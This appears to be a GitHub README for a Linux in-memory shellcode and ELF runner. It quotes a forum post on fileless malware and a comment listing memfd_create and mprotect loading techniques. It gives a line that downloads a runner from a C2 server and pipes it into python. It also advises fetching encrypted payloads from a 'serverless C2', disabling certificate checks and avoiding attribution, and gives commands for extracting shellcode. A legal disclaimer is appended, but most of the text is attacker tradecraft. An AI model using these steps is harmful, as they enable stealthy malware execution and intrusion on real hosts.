# Linux in-memory shellcode runner proof-of-concept
1. main.py runs pure x86 64-bit shellcode to print the number 42 as a result from EAX
2. new.py runs a ELF binary with only the .text section that prints Hello World to the screen (there is a null-terminator error in the code, just add \0 into the end of the string)
3. memfd_loader uses Adam Cornelissen's suggestion using a full ELF loader running in a first stage loader

For all three options, you can use a python script or for #3, add a http library in C to remotely retrieve the encrypted shellcode from a serverless C2 to run the decrypted payload. If you do this, make sure you disable verification of self-signed certificates or the request will fail. Free signed certificates are a dime in a dozen and can get revoked in cyberattack campaigns pretty quickly or attributed to specific threat actors so you don't want to burn a legitimate SSL/TLS cert.

# Original Post

"I feel that this topic is underexplored, but a lot of malware can be executed entirely in memory in Linux as well. This happened far before we all started using Powershell + .NET + CLR managed/x86 unmanaged runners for Windows/NT Kernel Machines.

All you need, on Linux hosts, is python installed with ctypes, which usually comes with a python installation. In some cases, stripped down versions of python is installed that may not have ctypes, but for most desktop machines ctypes is available to run shellcode runners on Linux entirely in memory.

So how is this invoked remotely?

1. Download from a remote C2 the script with the shellcode with wget/curl
2. Pipe it into Python, wget https://c2/runner.py | python

It's way easier to grab shellcode out of a ELF using objdump after gcc with specific compilation flags to grab the machine code out of the .text section, and because this isn't memory corruption but a staged loader command, it'll launch.

This isn't that significant to experienced attackers but many documented attackers underutilize this trick. Or spawn subprocesses in python that continues to enumerate and evaluate the infected host to use logic to execute additional stages."

# Adam's Comment

Good stuff. How about; Anonymous mmap → mprotect → function pointer (ctypes-like core). The mapping is anonymous (fd = −1). No pathname in /proc/<pid>/maps, but blocked by W^X policies (MemoryDenyWriteExecute, PaX/SELinux execmem).

Or FFI buffers (cffi/libffi) + mprotect. Allocate a raw byte buffer through FFI; obtain its address; invoke libc.mprotect(addr, len, PROT_READ|PROT_EXEC); cast buffer address to void(*)() and call. The buffer lives on the heap; only page permissions change. No file artifact.

memfd_create + in-memory ELF + fexecve (new process, no file), or, memfd_create + in-memory .so + dlopen("/proc/self/fd/<n>", …). This is not “inject bytes and call a function.” It’s loading and running a complete ELF program in a new process without touching disk. Not exactly like ctypes, more like file-descriptor backed ELF loaders, not raw shellcode tricks.

# Using Method 2, executing .text section

nasm -f elf64 helloworld.asm -o helloworld.o
ld -o helloworld.elf helloworld.o
objcopy -O binary --only-section=.text helloworld.elf helloworld.bin
xxd -p helloworld.bin | tr -d '\n' | sed 's/\(..\)/\\x\1/g' | xclip -selection clipboard
Copy and paste into the python runner and execute

# Using Method 3, executing a entire ELF file embedded inside a host loader ELF

xxd -i helloworld.elf → turn ELF into C array
Include it in your loader with #include
Compile loader → produces memfd_loader
Run loader → executes ELF in memory
xxd -p + grep -abo '7f454c46' → verify both main and embedded ELF headers

# ⚠️ Legal Disclaimer

**LinuxShellcodeOrELFRunner** is provided **for educational, research, and defensive cybersecurity purposes only**. By accessing or using this repository, you acknowledge and agree to the following:

1. **Intent of Use**
This project is designed to demonstrate techniques related to executing shellcode or ELF binaries on Linux environments. It is intended for **security research, penetration testing in controlled environments, and learning about Linux internals and exploit development**.

2. **No Malicious Use**
You may **not** use any code, scripts, or techniques in this repository to target systems, networks, or users without explicit authorization. Unauthorized use may violate local, national, or international laws.

3. **Assumption of Risk**
All operations performed using this repository are the **sole responsibility of the user**. The author **assumes no liability** for any damage, data loss, or legal consequences arising from its use.

4. **Educational Context**
Techniques shown may be inspired by historical exploits or research tools. They are included purely for learning purposes and should **never be deployed against systems you do not own or have explicit permission to test**.

5. **Compliance**
By using this repository, you confirm that you will comply with all applicable laws and regulations and use this project ethically and responsibly.

---

> ⚠️ **Reminder:** Misuse of offensive security tools can carry severe legal consequences. Use responsibly.
